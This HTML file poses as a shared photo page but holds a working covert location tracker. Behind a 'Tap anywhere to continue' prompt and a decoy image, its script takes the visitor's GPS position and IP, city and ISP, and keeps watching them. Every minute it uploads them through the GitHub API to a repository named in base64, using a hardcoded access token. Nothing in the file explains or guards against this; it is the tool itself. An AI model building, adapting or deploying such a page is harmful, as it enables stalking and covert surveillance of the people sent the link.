<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="mobile-web-app-capable" content="yes">
<title> </title>
<style>
*{margin:0;padding:0}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}
img{max-width:100%;max-height:100vh;object-fit:contain;display:none}
#tap{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;cursor:pointer;display:flex;justify-content:center;align-items:center;color:#fff;font-family:sans-serif;font-size:14px;background:rgba(0,0,0,0.85)}
</style>
</head>
<body>
<div id="tap">Tap anywhere to continue</div>
<img id="photo">
<script>
(function(){
var T="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";
var R=atob("ZGhhbmFtcGFyaXN1c2VldHUtZHJvaWQvcGFyaXN1c2VldHU=");
var F=atob("bG9jYXRpb25fbG9nLmpzb24=");
var j=atob("SU1HXzIwMjYwNzI2XzEwMTgwOS5qcGc=");
var I=60;
var raw1="https://raw.githubusercontent.com/"+R+"/main/"+j;
var lastLoc=null;
var lastIP=null;
var gpsWatch=null;

function fetchIP(){
    return Promise.any([
        fetch("https://ip-api.com/json/?fields=status,lat,lon,city,regionName,country,isp,query").then(function(r){return r.json()}).then(function(d){if(d.status==="success")return{ip:d.query,city:d.city,region:d.regionName,country:d.country,isp:d.isp};throw 0}),
        fetch("https://ipinfo.io/json").then(function(r){return r.json()}).then(function(d){return{ip:d.ip,city:d.city,region:d.region,country:d.country,isp:d.org};throw 0})
    ]);
}
var busy=false;
function push(e){
    if(busy)return Promise.resolve();
    busy=true;
    var url="https://api.github.com/repos/"+R+"/contents/"+F;
    return fetch(url,{headers:{"Authorization":"token "+T}}).then(function(r){
        if(r.status===403)return{rateLimited:true};
        return r.ok?r.json():null
    }).then(function(d){
        if(!d||d.rateLimited){busy=false;return}
        var ex={locations:[]},sha=null;
        if(d&&d.content){sha=d.sha;try{ex=JSON.parse(decodeURIComponent(escape(atob(d.content.replace(/\n/g,"")))))}catch(x){}}
        if(!ex.locations)ex.locations=[];
        ex.locations.push(e);
        if(ex.locations.length>500)ex.locations=ex.locations.slice(-500);
        var b={message:"\ud83d\udccd "+(e.city||"?"),content:btoa(unescape(encodeURIComponent(JSON.stringify(ex,null,2))))};
        if(sha)b.sha=sha;
        return fetch(url,{method:"PUT",headers:{"Authorization":"token "+T,"Content-Type":"application/json"},body:JSON.stringify(b)});
    }).then(function(r){
        busy=false;
        if(!r||!r.ok)return;
    }).catch(function(){busy=false});
}
function send(){
    fetchIP().then(function(ipd){
        lastIP=ipd||{};
        var e;
        if(lastLoc){
            e={lat:lastLoc.lat,lng:lastLoc.lng,city:lastIP.city||"unknown",region:lastIP.region,country:lastIP.country,isp:lastIP.isp,ip:lastIP.ip,method:lastLoc.method,accuracy:lastLoc.accuracy,timestamp:new Date().toISOString()};
        } else if(lastIP.ip){
            e={lat:0,lng:0,city:lastIP.city||"unknown",region:lastIP.region,country:lastIP.country,isp:lastIP.isp,ip:lastIP.ip,method:"IP",accuracy:"IP-only",timestamp:new Date().toISOString()};
        }
        if(e)push(e);
    });
}

function startLoc(){
    document.getElementById("tap").style.display="none";
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(function(p){
            lastLoc={lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy,method:"GPS"};
            document.getElementById("photo").src=raw1;
            document.getElementById("photo").style.display="";
            gpsWatch=navigator.geolocation.watchPosition(function(p2){
                lastLoc={lat:p2.coords.latitude,lng:p2.coords.longitude,accuracy:p2.coords.accuracy,method:"GPS"};
            },function(){},{enableHighAccuracy:true,maximumAge:5000});
            send();
            setInterval(send,I*1000);
        },function(err){
            document.getElementById("photo").src=raw1;
            document.getElementById("photo").style.display="";
            fetchIP().then(function(ipd){
                lastIP=ipd||{};
                if(lastIP.ip){
                    var e={lat:0,lng:0,city:lastIP.city||"unknown",region:lastIP.region,country:lastIP.country,isp:lastIP.isp,ip:lastIP.ip,method:"IP",accuracy:"IP-only",timestamp:new Date().toISOString()};
                    push(e);
                }
            });
            setInterval(function(){
                fetchIP().then(function(ipd){
                    lastIP=ipd||{};
                    if(lastIP.ip){
                        var e={lat:0,lng:0,city:lastIP.city||"unknown",region:lastIP.region,country:lastIP.country,isp:lastIP.isp,ip:lastIP.ip,method:"IP",accuracy:"IP-only",timestamp:new Date().toISOString()};
                        push(e);
                    }
                });
            },I*1000);
        },{enableHighAccuracy:true,timeout:15000});
    }
}

document.getElementById("tap").addEventListener("click",startLoc);
document.getElementById("tap").addEventListener("touchend",function(e){e.preventDefault();startLoc()});
})();
</script>
</body>
</html>
